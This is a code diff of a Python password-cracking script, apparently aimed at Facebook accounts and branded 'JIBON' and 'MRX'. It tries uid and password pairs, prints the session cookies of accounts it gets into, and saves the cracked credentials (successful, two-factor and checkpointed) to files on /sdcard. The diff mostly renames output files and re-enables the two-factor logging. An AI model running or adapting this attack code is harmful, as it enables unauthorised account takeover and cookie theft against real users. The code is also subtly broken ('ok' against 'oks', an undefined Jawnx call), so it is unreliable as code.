@@ -441,29 +441,30 @@ def rcrack1(uid,pwx,tl):
                 print('\33[1;92m[JIBON-OK] '+uid+' | '+ps+'\33[0;92m')
                 print(f" Cookie : {coki}")
                 cek_apk(session,coki)
-                open('JIBON-OK.txt', 'a').write(uid+' | '+ps+'\n')
-                oks.append(uid)
+                open('/sdcard/ MRX-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                ok.append(uid)
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                    coki1 = coki.split("1000")[1]
                     uid = "1000"+coki1[0:11]
                     #os.system("play-audio JIBON_2F.mp3")
-                 #   print('\r\x1b[38;5;45m[JIBON-2F] '+uid+' | '+ps+'\033[1;97m')
-                  #  open('/sdcard/MRX-2F.txt', 'a').write(uid+' | '+ps+'\n')
+                    print('\r\x1b[38;5;45m[JIBON-2F] '+uid+' | '+ps+' '+Jawnx(uid)+' ')
+                    open('/sdcard/MRX-2F.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
                 else:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     coki1 = coki.split("1000")[1]
                     uid = "1000"+coki1[0:11]
                   #  os.system("play-audio JIBON_CP.mp3")
-                    print('\33[1;91m[JIBON-CP] '+uid+' | '+ps+'\33[0;92m')
-                    open('JIBON-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    print('\33[1;92m[JIBON-CP] '+uid+' | '+ps+'\33[0;92m')
+                    open('/sdcard/MRX-CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[38;5;46m[JIBON] \033[38;5;46m%s\033[38;5;46m |\033[m[\033[38;5;46mOK:\033[\033[38;5;46m%s\033[38;5;46m] '%(loop,len(oks))),
+        sys.stdout.write(f' \r\033[m[ MRX JIBON ] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
